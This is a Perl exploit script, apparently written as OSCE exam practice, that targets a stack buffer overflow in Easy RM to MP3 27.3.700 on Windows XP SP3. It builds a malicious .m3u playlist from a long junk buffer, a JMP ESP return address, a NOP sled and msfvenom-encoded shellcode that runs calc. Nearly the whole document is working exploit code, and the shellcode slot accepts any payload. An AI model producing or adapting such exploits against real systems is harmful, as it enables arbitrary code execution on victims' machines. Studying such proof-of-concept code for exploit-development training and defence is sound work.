
#
# Exploit for Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker
# Written by BaffledJimmy as part of OSCE Prep
# https://www.tommacdonald.co.uk
#
# Tested on Windows XP SP3 (English) 32bit
#
#
#
my $file= "CalcPOC.m3u";

my $junk= "A" x 26104;
my $eip = pack('V',0x01aaf23a);  #JMP ESP from codec2

my $shellcode = "\x90" x 25;

# windows/exec - 144 bytes
# msfvenom -p windows/exec CMD=calc -e x86/shikata_ga_nai EXITFUNC=seh -f perl -b '\x00\x0a'

$shellcode = $shellcode . "\xd9\xf7\xd9\x74\x24\xf4\x5e\xb8\xa0\x87\x7e\xee\x29\xc9" .
"\xb1\x30\x83\xc6\x04\x31\x46\x14\x03\x46\xb4\x65\x8b\x12" .
"\x5c\xeb\x74\xeb\x9c\x8c\xfd\x0e\xad\x8c\x9a\x5b\x9d\x3c" .
"\xe8\x0e\x11\xb6\xbc\xba\xa2\xba\x68\xcc\x03\x70\x4f\xe3" .
"\x94\x29\xb3\x62\x16\x30\xe0\x44\x27\xfb\xf5\x85\x60\xe6" .
"\xf4\xd4\x39\x6c\xaa\xc8\x4e\x38\x77\x62\x1c\xac\xff\x97" .
"\xd4\xcf\x2e\x06\x6f\x96\xf0\xa8\xbc\xa2\xb8\xb2\xa1\x8f" .
"\x73\x48\x11\x7b\x82\x98\x68\x84\x29\xe5\x45\x77\x33\x21" .
"\x61\x68\x46\x5b\x92\x15\x51\x98\xe9\xc1\xd4\x3b\x49\x81" .
"\x4f\xe0\x68\x46\x09\x63\x66\x23\x5d\x2b\x6a\xb2\xb2\x47" .
"\x96\x3f\x35\x88\x1f\x7b\x12\x0c\x44\xdf\x3b\x15\x20\x8e" .
"\x44\x45\x8b\x6f\xe1\x0d\x21\x7b\x98\x4f\x2f\x7a\x2e\xea" .
"\x1d\x7c\x30\xf5\x31\x15\x01\x7e\xde\x62\x9e\x55\x9b\x93" .
"\x6f\x64\x31\x03\xd6\x1d\x78\x49\xe9\xcb\xbe\x74\x6a\xfe" .
"\x3e\x83\x72\x8b\x3b\xcf\x34\x67\x31\x40\xd1\x87\xe6\x61" .
"\xf0\xeb\x69\xf2\x98\xeb";



open($FILE,">$file");
print $FILE $junk.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
